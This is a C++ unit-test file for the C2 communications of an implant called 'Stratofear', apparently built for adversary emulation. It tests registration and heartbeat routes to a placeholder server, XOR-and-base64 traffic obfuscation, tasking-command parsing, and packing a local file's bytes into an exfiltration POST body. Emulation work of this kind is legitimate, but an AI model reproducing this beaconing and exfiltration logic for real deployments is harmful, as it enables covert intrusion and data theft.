#include "comms.hpp"
#include "core.hpp"
#include <gtest/gtest.h>

struct StratofearCommsTests : public testing::Test {
    
    Configuration stratofearConfig;
    
    void SetUp() override {
        stratofearConfig.configured = true;
        stratofearConfig.registered = true;
        stratofearConfig.domain = "1.2.3.4:80";
        strcpy(stratofearConfig.UUID, "hap");
        strcpy(stratofearConfig.version, "py");
    }
};

class StratofearCommsNoSetupTests : public testing::Test {

};

TEST_F(StratofearCommsTests, SetUpTest) {
    bool result = stratofearConfig.configured;
    EXPECT_TRUE(result);
}

TEST_F(StratofearCommsNoSetupTests, VerifyTestDylibTest) {
    std::filesystem::path filepath = std::filesystem::current_path();
    filepath += "/../module/test_module/Debug/libtest_module.dylib";
    if(!std::filesystem::exists(filepath)){
        filepath = std::filesystem::current_path();
        filepath += "/../module/test_module/Release/libtest_module.dylib";
    }
    EXPECT_TRUE(std::filesystem::exists(filepath));
}

TEST_F(StratofearCommsNoSetupTests, LoadConfigFailureTest) {
    Configuration stratofearConfig;
    bool result = stratofearConfig.configured;
    EXPECT_FALSE(result);
}

TEST_F(StratofearCommsTests, HTTPSBuildBodyRegisterTest) {
    stratofearConfig.registered = false;
    std::string TestURL = Communication::HTTPS::BuildRoute(stratofearConfig, Communication::HEARTBEAT_ID);
    std::string ExpectedURL = TestURL = "https://" + stratofearConfig.domain + Communication::REGISTER_ROUTE;
    std::string body = Communication::HTTPS::BuildBody(stratofearConfig, Communication::HEARTBEAT_ID, "", "");
    bool result = false;
    std::string combinedUUID(stratofearConfig.UUID, 3);
    combinedUUID.append(stratofearConfig.version, 2);
    //Decode and deobfuscate 
    std::string decodedString = base64_decode_string(body);
    std::string decipheredString = Communication::XorCryptToString(decodedString);
    if (TestURL == ExpectedURL && decipheredString == combinedUUID){
        result = true;
    }
    EXPECT_TRUE(result);
}

TEST_F(StratofearCommsTests, HTTPSBuildBodyRe_RegisterTest) {
    //Send an already registered request
    std::string TestURL = Communication::HTTPS::BuildRoute(stratofearConfig, Communication::HEARTBEAT_ID);
    // Build UUID
    std::string combinedUUID(stratofearConfig.UUID, 3);
    combinedUUID.append(stratofearConfig.version, 2);
    //Build route of an expected heartbeat
    std::string ExpectedURL = "https://" + stratofearConfig.domain + "/" + combinedUUID + Communication::TASK_ROUTE;
    std::string body = Communication::HTTPS::BuildBody(stratofearConfig, Communication::HEARTBEAT_ID, "", "");
    bool result = false;
    if (TestURL == ExpectedURL && body == ""){
        result = true;
    }
    EXPECT_FALSE(result);
}

TEST_F(StratofearCommsNoSetupTests, ParseHTTPSResponseHeartbeat) {
    Communication::HTTPS::Response TestResponse;
    std::string heartbeat = "{\"id\": \"0x60\"}";
    TestResponse.body = Communication::HTTPS::convertString_XOR_Enc(heartbeat);
    TestResponse = Communication::HTTPS::ParseHTTPSResponse(TestResponse, false);
    bool result = false;
    if (TestResponse.command == Communication::HEARTBEAT_ID){
        result = true;
    }
    EXPECT_TRUE(result);
}

TEST_F(StratofearCommsNoSetupTests, ParseHTTPSResponseEmptyResponse) {
    Communication::HTTPS::Response TestResponse;
    TestResponse = Communication::HTTPS::ParseHTTPSResponse(TestResponse, false);
    EXPECT_EQ(TestResponse.command, "");
}

TEST_F(StratofearCommsNoSetupTests, ParseHTTPSResponseEmptyCommand) {
    Communication::HTTPS::Response TestResponse;
    TestResponse = Communication::HTTPS::ParseHTTPSResponse(TestResponse, false);
    EXPECT_EQ(TestResponse.command, "");
}

TEST_F(StratofearCommsNoSetupTests, ParseHTTPSResponseErrorResponse) {
    Communication::HTTPS::Response TestResponse;
    std::string errorMessage = "Internal Server Error";
    TestResponse.body = Communication::HTTPS::convertString_XOR_Enc(errorMessage);
    TestResponse = Communication::HTTPS::ParseHTTPSResponse(TestResponse, false);
    EXPECT_EQ(TestResponse.command, "");
}

TEST_F(StratofearCommsNoSetupTests, ParseHTTPResponseBadJSONTest) {
    Communication::HTTPS::Response TestResponse;
    std::string errorMessage = "Internal Server Error";
    TestResponse.body = Communication::HTTPS::convertString_XOR_Enc(errorMessage);
    ASSERT_NO_THROW(Communication::HTTPS::ParseHTTPSResponse(TestResponse, false));
}

TEST_F(StratofearCommsNoSetupTests, XORandDecodeStringTest) {
    // String represents the base64 encoded XOR bytes, XOR bytes do not render as a string
    std::string encodedString = "GB4bDhlLGA4IGQ4fSxgfGQIFDA=="; //super secret string
    std::string decodedString = base64_decode_string(encodedString);
    std::string decipheredString = Communication::XorCryptToString(decodedString);
    EXPECT_EQ(decipheredString, "super secret string");
}


TEST_F(StratofearCommsTests, RetrieveCMDBuildPostBodySuccess) {
    std::filesystem::path filepath = std::filesystem::current_path();
    filepath += "/../module/test_module/Debug/libtest_module.dylib";
    if(!std::filesystem::exists(filepath)){
        filepath = std::filesystem::current_path();
        filepath += "/../module/test_module/Release/libtest_module.dylib";
    }
    std::ifstream testfile(filepath);
    std::string testfileString((std::istreambuf_iterator<char>(testfile)), std::istreambuf_iterator<char>());
    std::string encodedTestFile = base64_encode_string(testfileString);

    // Actual Test
    setenv("fn", filepath.c_str(), 1);
    std::string postBodyString = Communication::HTTPS::BuildBody(stratofearConfig, Communication::RETRIEVE_MODULE_RESULT, "fn", "");

    // Decode & decipher the json blob then pull out the encoded file bytes
    std::string decoded_string = base64_decode_string(postBodyString);
    std::string deciphered_string = Communication::XorCryptToString(decoded_string);
    nlohmann::json parsed_response = nlohmann::json::parse(deciphered_string);
    std::string encoded_bytes = parsed_response["moduleBytes"];
    ASSERT_EQ(encodedTestFile, encoded_bytes);
}

TEST_F(StratofearCommsTests, RetrieveCMDBuildPostBodyNULLenvVar) {
    // Check & remove environment variables
    if (getenv("fn") != nullptr) {
        unsetenv("fn");
    }
    std::string postBodyString = Communication::HTTPS::BuildBody(stratofearConfig, Communication::RETRIEVE_MODULE_RESULT, "fn", "");
    // Decode & XOR the response
    std::string decoded_string = base64_decode_string(postBodyString);
    std::string deciphered_string = Communication::XorCryptToString(decoded_string);
    EXPECT_TRUE(deciphered_string.contains("Environment variable not found"));
}

TEST_F(StratofearCommsTests, RetrieveCMDBuildPostBodyWithNoFile) {
    // Check & remove environment variables
    if (getenv("fn") != nullptr) {
        unsetenv("fn");
    }  
    std::filesystem::path filepath = "/test.txt";
    setenv("fn", filepath.c_str(), 1);
    std::string postBodyString = Communication::HTTPS::BuildBody(stratofearConfig, Communication::RETRIEVE_MODULE_RESULT, "fn", "");
    std::string decoded_string = base64_decode_string(postBodyString);
    std::string deciphered_string = Communication::XorCryptToString(decoded_string);
    EXPECT_TRUE(deciphered_string.contains("Failed to open file"));
}